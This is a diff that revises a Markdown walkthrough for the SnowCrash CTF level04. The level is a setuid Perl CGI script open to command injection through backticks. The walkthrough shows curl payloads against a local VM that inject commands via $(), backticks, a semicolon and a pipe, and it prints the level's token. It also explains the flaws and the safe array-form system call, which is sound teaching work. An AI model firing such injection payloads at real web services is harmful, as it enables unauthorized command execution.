@@ -10,7 +10,11 @@ qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio 
 Exploit a Perl CGI script with command injection vulnerability to retrieve the flag04 token.
 
 ## Vulnerability
-The `level04.pl` Perl CGI script runs with setuid flag04 privileges and has a command injection vulnerability:
+Command injection in Perl backticks with unsanitized user input.
+
+## Exploitation
+
+The `level04.pl` Perl CGI script runs with setuid flag04 privileges and executes user input in backticks:
 
 ```perl
 sub x {
@@ -20,23 +24,51 @@ sub x {
 x(param("x"));
 ```
 
-**The Problem**: Backticks execute in a shell context and interpret metacharacters like `$()`, `;`, `|`.
+**The Problem:**
+- Backticks execute in shell context
+- Shell interprets metacharacters: `$()`, `;`, `|`, etc.
+- User input from URL parameter `x` is not validated or escaped
+- Binary runs with flag04 privileges (setuid)
 
-## Exploitation
+### Exploit Steps
 
-### Using Command Substitution
+#### Step 1: Connect to level04 and Test
 ```bash
-curl "http://localhost:4747/?x=\$(getflag)"
+sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no -p 4242 level04@localhost id
 ```
 
-This becomes: `echo $(getflag) 2>&1` which executes getflag with flag04 privileges.
+#### Step 2: Execute Command Injection via HTTP
+The CGI script listens on port 4747 and accepts URL parameters:
 
-### Other Methods
-- **Backticks**: `curl "http://localhost:4747/?x=\`getflag\`"`
-- **Semicolon**: `curl "http://localhost:4747/?x=test%3Bid"` (URL-encoded `;`)
-- **Pipe**: `curl "http://localhost:4747/?x=test%7Cgetflag"` (URL-encoded `|`)
+```bash
+curl -s "http://localhost:4747/?x=\$(getflag)"
+```
 
-## Result
+**URL Parameter Breakdown:**
+- `?x=` - CGI parameter name
+- `$(getflag)` - Command substitution syntax (POSIX shell)
+- This gets inserted into backticks: `` `echo $(getflag) 2>&1` ``
+- Shell expands `$(getflag)` and passes result to echo
+
+#### Step 3: Alternative Injection Methods
+
+- **Using backticks instead of $():**
+  ```bash
+  curl "http://localhost:4747/?x=\`getflag\`"
+  ```
+
+- **Using semicolon to chain commands:**
+  ```bash
+  curl "http://localhost:4747/?x=test%3Bgetflag"
+  ```
+
+- **Using pipe operator:**
+  ```bash
+  curl "http://localhost:4747/?x=test%7Cgetflag"
+  ```
+
+#### Step 4: Extract Token from Response
+The response contains the token:
 ```
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
@@ -44,12 +76,13 @@ Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ## Security Flaws
 
 1. **No input validation**: User input directly used in shell execution
-2. **Shell interpretation**: Backticks invoke shell with full metacharacter support
-3. **Setuid privileges**: Amplifies impact to flag04 permissions
-4. **No safe APIs used**: Should use `system("cmd", $arg)` array form instead
+2. **Unsafe backticks**: Backticks invoke shell with full metacharacter support
+3. **Setuid amplification**: Binary runs with flag04 privileges
+4. **No escaping**: Input not escaped or quoted
+5. **Unsafe API**: Should use `system("cmd", @args)` array form instead of shell string interpolation
 
 ## Answer
 
-**Level04 Token**: `ne2searoevaevoem4ov4ar8ap`
-**Vulnerability**: OS Command Injection via Perl CGI backticks
-**Impact**: Arbitrary Code Execution with flag04 privileges
+- **Level04 Token**: `ne2searoevaevoem4ov4ar8ap`
+- **Vulnerability Type**: OS command injection via Perl backticks
+- **Impact**: Arbitrary code execution with flag04 privileges
